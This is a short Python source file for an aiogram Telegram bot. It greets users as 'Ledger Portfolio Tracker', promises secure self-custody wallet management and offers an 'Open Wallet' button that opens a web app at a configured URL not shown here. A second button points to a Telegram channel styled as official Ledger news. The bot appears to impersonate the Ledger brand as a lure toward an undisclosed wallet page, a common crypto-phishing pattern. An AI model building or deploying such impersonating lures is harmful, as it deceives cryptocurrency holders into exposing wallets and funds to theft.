import os
from aiogram import Bot,Router,F
from aiogram.types import Message,CallbackQuery
from aiogram.filters import Command,CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types.web_app_info import WebAppInfo
from bot_app.config import settings

url = settings.url
private_router = Router()

def web_kb(data:dict[str,str]):
    builder  = InlineKeyboardBuilder()
    for text,value in data.items():
        if value == "web":
            builder.button(text=text,web_app=WebAppInfo(url=settings.url))
        else:
            builder.button(text=text,url='https://t.me/ledger_mobile')

    return builder.adjust(1).as_markup()


text="""Welcome to Ledger Portfolio Tracker!

Manage and monitor your crypto portfolio directly inside Telegram — securely, privately, and seamlessly.

Supports 1500+ assets ∙ Live portfolio tracking ∙ Instant transactions ∙ Full self‑custody

Start using the Mini App to explore your Ledger account, track portfolio balance, and manage assets — all from one secure interface.

Always stay connected to your crypto — anywhere, anytime"""

@private_router.message(CommandStart())
async def start(message: Message):
    await message.answer(text,reply_markup= web_kb({'Open Wallet':'web',"Ledger | Official News":'url'}))
